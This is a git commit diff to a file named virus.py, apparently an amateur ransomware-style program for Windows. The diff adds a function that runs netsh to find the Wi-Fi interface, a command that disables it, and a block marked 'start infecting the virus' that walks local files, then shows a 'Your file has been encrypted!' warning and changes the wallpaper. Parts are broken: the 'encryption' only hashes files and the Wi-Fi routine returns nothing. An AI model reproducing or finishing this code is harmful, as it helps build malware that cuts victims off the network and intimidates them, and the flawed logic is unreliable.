3909a5e713fa4fbaccea04276435ac64b40358fd
IndentErr <62327889+IndentErr@users.noreply.github.com>
2021-12-21 01:30:17 -0800

    Update virus.py

--- virus.py
+++ virus.py
@@ -16,22 +16,25 @@ def warning():
     ctypes.windll.user32.SystemParametersInfoW(20, 0, wall_paper_file , 3)
     ctypes.windll.user32.MessageBoxW(0, "Your file has been encrypted!", "Warning", 0)
 
-def encryption(filename):
+def encryption(file_list):
     h  = hashlib.sha256()
     b  = bytearray(128*1024)
     mv = memoryview(b)
-    for n in filename:
+    for filename in file_list:
         with open(filename, 'rb', buffering=0) as f:
             for n in iter(lambda : f.readinto(mv), 0):
                 h.update(mv[:n])
-    return h.hexdigest()
 
-
-def file_finder(dirname):
-    subfolders= [f.path for f in os.scandir(dirname) if f.is_dir()]
-    for dirname in list(subfolders):
-        subfolders.extend(file_finder(dirname))
-    return subfolders
+def wifi_scraper():
+    wifi_ssid = None
+    os.system("netsh wlan show interface" + ' > output.txt')
+    if os.path.exists('output.txt'):
+        fp = open('output.txt', "r")
+        output = fp.read()
+        ssid_line = fp.readline()[9]
+        fp.close()
+    os.remove("output.txt")
+    
 
 
 if main_file_directory is not destination_directory:
@@ -40,5 +43,11 @@ if main_file_directory is not destination_directory:
 
 elif main_file_directory is destination_directory:
     #start infecting the virus
-    sub_directory_list = file_finder(main_file_directory)
-    encryption(sub_directory_list)
+    sub_directory_list = os.listdir()
+    wifi = wifi_scraper()
+    try:
+        os.system("netsh interface set interface name = " + wifi + " admin=DISABLED")#disable wifi
+        encryption(sub_directory_list)
+        warning()
+    except:
+        pass
